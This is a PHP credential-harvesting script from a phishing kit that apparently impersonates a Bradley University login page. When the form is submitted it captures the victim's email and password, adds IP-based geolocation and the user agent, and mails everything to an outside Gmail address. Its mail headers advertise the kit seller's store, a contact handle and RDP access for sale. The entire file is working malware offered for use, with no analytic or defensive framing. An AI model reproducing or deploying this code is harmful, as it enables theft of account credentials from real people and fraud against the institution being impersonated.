<?php

$ip = getenv("REMOTE_ADDR");	
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$ip"));
$country = $geo["geoplugin_countryName"];
$region = $geo["geoplugin_regionName"];
$city = $geo["geoplugin_city"];
$useragent = $_SERVER['HTTP_USER_AGENT'];


if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['password'];
 
		$to = "roberthook004@gmail.com";
		
		
         $subject = "Bradley University : $ip";
		 $message =  "━━━━━━━━━👑 KHALIFA STORE 👑━━━━━━━━━ \n";
		 $message .= "⭐ XUsername            : ".$email."\r\n";
         $message .= "⭐ xPassword            : ".$password."\r\n";
		 $message .= "━━━━━━━━━━ IP INFORMATION ━━━━━━━━━━━ "."\r\n";
		 $message .= "Country              : ".$country."\r\n";
		 $message .= "State                : ".$region."\r\n";
		 $message .= "City                 : ".$city."\r\n";
		 $message .= "USER AGENT           : ".$useragent."\r\n";
		 $message .= "IP                   : ".$ip."\r\n";
		 $header  = "Content type: KHALIFA TOOLZ  icq  @verifykhalifa \r\n";
         $header .= "MIME-Version: 2.0 * Contact me for No Red Page Link, RDP Available* \r\n";
         $header .= "Content-type: text/html\r\n";
		 

		 mail ($to,$subject,$message,$header);
}

?>